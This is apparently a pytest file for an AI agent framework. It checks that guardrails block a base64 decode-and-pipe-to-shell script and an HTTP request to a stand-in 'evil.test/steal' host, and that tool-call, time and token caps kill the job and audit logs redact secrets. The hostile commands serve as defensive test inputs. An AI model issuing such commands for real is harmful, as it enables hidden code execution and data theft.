import json
from pathlib import Path

from haris.agent.settings import AgentSettings
from haris.models import VerificationTier
from tests.agent_support import (
    Clock,
    FakeRuntime,
    ScriptedBackend,
    policy_for,
    run,
    session_for,
)

BAD = "echo aWQ= | base64 -d | sh"


def _audits(out: Path) -> list[dict[str, object]]:
    rows: list[dict[str, object]] = []
    for path in (out / "agent").glob("*/audit.jsonl"):
        rows.extend(json.loads(line) for line in path.read_text().splitlines())
    return rows


def test_decode_and_execute_is_logged_and_not_run(tmp_path: Path):
    """Scenario: Guardrail rejects decode-and-execute."""
    session, client = session_for("http://127.0.0.1")
    tier = session.correlated[0].canonical.verification.tier
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [
            {"tool": "run_python", "arguments": {"script": BAD}},
            {"done": True, "claim": ""},
        ]
    )
    run(session, client, backend, policy_for(str(tmp_path)), runtime)
    assert runtime.calls == []
    assert tier is VerificationTier.REPLAY_VERIFIED
    assert any(row.get("kind") == "guardrail" for row in _audits(tmp_path))
    client.close()


def test_tool_call_cap_aborts_on_the_41st(tmp_path: Path):
    """Scenario: Budget stop at agent.max_tool_calls 40."""
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [{"tool": "read_file", "arguments": {"path": "/work/a.txt"}}]
    )
    run(
        session,
        client,
        backend,
        policy_for(str(tmp_path), AgentSettings(max_tool_calls=40)),
        runtime,
    )
    assert len(runtime.calls) == 40
    assert runtime.killed
    assert (
        session.correlated[0].canonical.verification.tier
        is VerificationTier.REPLAY_VERIFIED
    )
    assert any(
        row.get("kind") == "kill" and row.get("reason") == "tool_calls"
        for row in _audits(tmp_path)
    )
    client.close()


def test_wall_clock_cap_uses_the_fake_clock(tmp_path: Path):
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    clock = Clock()
    ticks = iter((0.0, 0.0, 10_000.0))

    def fake_clock() -> float:
        clock.now = next(ticks)
        return clock.now

    backend = ScriptedBackend(
        [{"tool": "read_file", "arguments": {"path": "/work/a.txt"}}]
    )
    run(
        session,
        client,
        backend,
        policy_for(str(tmp_path), AgentSettings(wall_clock_s=600)),
        runtime,
        clock=fake_clock,
    )
    assert len(runtime.calls) == 1
    assert runtime.killed
    assert any(row.get("reason") == "wall_clock" for row in _audits(tmp_path))
    client.close()


def test_token_cap_stops_the_job(tmp_path: Path):
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [{"tool": "read_file", "arguments": {"path": "/work/a.txt"}}],
        tokens=60,
    )
    run(
        session,
        client,
        backend,
        policy_for(str(tmp_path), AgentSettings(max_tokens=100)),
        runtime,
    )
    assert len(runtime.calls) == 1
    assert runtime.killed
    assert any(row.get("reason") == "tokens" for row in _audits(tmp_path))
    client.close()


def test_scope_violation_kills_the_job(tmp_path: Path):
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [
            {
                "tool": "http_request",
                "arguments": {"method": "GET", "url": "http://evil.test/steal"},
            }
        ]
    )
    run(session, client, backend, policy_for(str(tmp_path)), runtime)
    assert runtime.calls == []
    assert runtime.killed
    assert (
        session.correlated[0].canonical.verification.tier
        is VerificationTier.REPLAY_VERIFIED
    )
    assert any(
        row.get("kind") == "guardrail" and row.get("reason") == "scope"
        for row in _audits(tmp_path)
    )
    client.close()


def test_third_guardrail_hit_aborts(tmp_path: Path):
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [{"tool": "run_python", "arguments": {"script": "echo hi | sh"}}]
    )
    run(
        session,
        client,
        backend,
        policy_for(str(tmp_path), AgentSettings(guardrail_abort_at=3)),
        runtime,
    )
    assert runtime.calls == []
    assert runtime.killed
    hits = [row for row in _audits(tmp_path) if row.get("kind") == "guardrail"]
    assert len(hits) >= 3
    client.close()


def test_audit_redacts_secrets_and_only_appends(tmp_path: Path):
    session, client = session_for("http://127.0.0.1")
    runtime = FakeRuntime()
    backend = ScriptedBackend(
        [
            {
                "tool": "read_file",
                "arguments": {
                    "path": "/work/a.txt",
                    "note": "api_key=supersecretvalue",
                },
            },
            {"done": True, "claim": "done"},
        ]
    )
    run(session, client, backend, policy_for(str(tmp_path)), runtime)
    text = "\n".join(
        path.read_text() for path in (tmp_path / "agent").glob("*/audit.jsonl")
    )
    assert "supersecretvalue" not in text
    assert "[REDACTED]" in text
    client.close()
